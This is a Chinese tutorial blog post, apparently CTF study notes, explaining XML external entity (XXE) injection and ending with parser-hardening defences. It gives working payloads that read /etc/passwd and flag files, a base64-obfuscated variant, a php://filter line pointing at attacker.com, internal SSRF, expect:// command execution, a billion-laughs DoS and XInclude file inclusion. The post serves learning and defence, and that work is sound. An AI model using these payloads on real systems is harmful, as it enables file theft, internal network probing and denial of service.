---
title: XXE:XML外部实体注入漏洞
abbrlink: 7f9d86d3
date: 2022-10-20 12:40:00
cover: false
tags:
  - CTF-Web
  - XXE
categories:
  - CTF
  - Web安全
---



转自:https://blog.gm7.org/

>`XXE（XML External Entity Injection）`, 即XML外部实体注入漏洞
>
>它产生的原因是：**应用程序在解析XML内容时，没有禁止`外部实体`的加载，导致可加载恶意外部文件**；
>
>由此, 我们可以通过可控的外部实体来读取文件, 执行命令等
>
>**所有能传能解析XML数据给服务端的地方，都可能存在XXE**

# 1XML和DTD

- 一般的XML结构:

```
<?xml version="1.0" encoding="UTF-8" ?>  XML 声明文件的可选部分，如果存在需要放在文档的第一行
  
<userInfo>
	<name>d4m1ts</name>
	<age>18</age>
</userInfo>
<p attr="ssss">aa</p>  //属性需要加引号
<!-- 我是注释 -->
```

正确嵌套,标签闭合, 大小写敏感

<br>

- `DTD(Document Type Definition)`文档类型定义,作用是定义 XML 文档的合法构建模块，它使用一系列合法的元素来**定义文档的结构**。

**内部`DOCTYPE(Document Type)`声明**

```xml-dtd
  <!-- 语法 -->
  <!DOCTYPE root-element [element-declarations]>
    <?xml version="1.0" encoding="UTF-8" ?>
  <!DOCTYPE userInfo [                
          <!ELEMENT userInfo (name,age)>
          <!ELEMENT name (#PCDATA)>
          <!ELEMENT age (#PCDATA)>
          ]>
  <userInfo>
      <name>d4m1ts</name>
      <age>18</age>
  </userInfo>
```

`!DOCTYPE userInfo` (第二行)定义此文档是 **`userInfo`** 类型的文档。(自定义)

`!ELEMENT userInfo` (第三行)定义 **`userInfo`** 元素下面两个走元素："`name`、`age`"

`!ELEMENT name` (第四行)定义 **`name`** 元素为 "`#PCDATA`" 类型

`PCDATA` 是会被解析器解析的文本，这些文本将**被解析器检查实体以及标记，文本中的标签会被当作标记来处理，而实体会被展开**

`CDATA` 是不会被解析器解析的文本。在这些文本中的**标签不会被当作标记来对待，其中的实体也不会被展开**。

<br>

**也可以引入外部的`dtd`文件作为`DOCTYPE(Document Type)`声明**

```xml
  <!-- XML文件 -->
  <?xml version="1.0"?>
  <!DOCTYPE note SYSTEM "note.dtd">
  <note>
    <to>Tove</to>
    <from>Jani</from>
    <heading>Reminder</heading>
    <body>Don't forget me this weekend!</body>
  </note>
```

这里引入了`note.dtd`中的声明:

```xml-dtd
  <!-- 包含 DTD 的 "note.dtd" 文件 -->
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT from (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
```

这里有5个预定义的实体引用，这是为了防止在解析的时候，给我们输入的`<`当成标签来处理，导致异常:

```
&lt;   --- <
&gt;   --- >
&amp;   --- &
&quot;  ---"
&apos;  ---'
```

***

DTD是用于**定义引用普通文本或特殊字符的快捷方式的`变量`**。

```
  <!-- 语法 -->
  <!ENTITY entity-name "entity-value">
```

```xml-dtd
  <?xml version="1.0" encoding="UTF-8" ?>
  <!DOCTYPE userInfo [
          <!ELEMENT userInfo (name,age)>
          <!ELEMENT name (#PCDATA)>
          <!ELEMENT age (#PCDATA)>
          <!ENTITY name "d4m1ts">
          ]>

  <userInfo>
      <name>&name;</name>
      <age>18</age>
  </userInfo>
  <!-- 这里就将"d4m1ts"定义为了内部实体"name" -->
```

外部实体声明:

```xml
<!-- 语法 -->
<!ENTITY entity-name SYSTEM "URI/URL">
```

```xml
  <!-- 不要求后缀一定是dtd，只要符合dtd文件格式即可 -->
  <!ENTITY name SYSTEM "http://baidu.com/test.dtd">
  <!-- 这里就将"http://baidu.com/test.dtd"定义为了外部实体"name",后面通过&name就能够访问到从"http://baidu.com/test.dtd"处读取到的内容 -->
```

<br>

***

<br>

# 2漏洞和利用

从前面**外部实体声明**那里可以看出, 这里是从外部URL加载`DTD`文件, 那么应该也可以从其他位置加载数据,例如**`file://`**,那么就可以实现任意文件读取或者`SSRF`等

## 读取文件:

这里是读取根目录下的flag文件

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[                                                 
<!ENTITY xxe SYSTEM "file:///flag">
]>

<user><username>&xxe;</username><password>asdf</password></user>
```

```xml-dtd
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
  ]>
  
  <foo>&xxe;</foo>
```

- **base64编码:**

```xml-dtd
<!DOCTYPE test [
    <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> 
    %init;
    ]>
<foo/>
```

这里解码就是`file:///etc/passwd`

- php伪协议输出源码:

```xml-dtd
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://attacker.com/file.php" >
]>
<foo>&xxe;</foo>
```

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[                                                 
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php">
]>

<user><username>&xxe;</username><password>124</password></user>
```

- 请求内网其他地址:

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root[                                                 
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://10.244.80.130">
]>

<user><username>&xxe;</username><password>124</password></user>
```







## SSRF

服务端请求伪造,以服务器的什么向某个地址发起请求

```xml-dtd
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE userInfo [
        <!ELEMENT userInfo (name)>
        <!ELEMENT name (#PCDATA)>
        <!ENTITY name SYSTEM "http://baidu.aaaa">
        ]>

<userInfo>
    <name>&name;</name>
</userInfo>
```



## 命令执行:

用的比较少,要**在安装`expect`扩展的`PHP环境`里执行系统命令**

```xml-dtd
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "expect://ls" >
]>

<root>
<name>&xxe;</name>
</root>
```



## DOS攻击

```xml-dtd
<?xml version="1.0"?>
   <!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```



## XInclude攻击

一些情况下，我们可能无法控制整个XML文档，也就无法完全`XXE`，但是我们可以控制其中一部分，这个时候就可以使用`XInclude`

`XInclude`是XML规范的一部分，它允许**从子文档构建XML文档**。可以在XML文档中的任何数据值中放置`XInclude Payload`

要执行`XInclude`攻击，需要引用`XInclude`命名空间并提供要包含的文件的路径。例如：

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```



# 防御

- 使用开发语言提供的禁用外部实体的方法,不同的类可能设置方法也不一样，具体情况具体分析。

php:

```php
libxml_disable_entity_loader(true);
```

java:

```java
SAXReader saxReader = new SAXReader();
saxReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

Python:

```python
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```

- 过滤用户提交的XML数据

过滤关键字：`<\!DOCTYPE`和`<\!ENTITY`，或者`SYSTEM`和`PUBLIC`。

- 不允许XML中含有自己定义的DTD



其他的用到再补充(包括`bline xxe`)











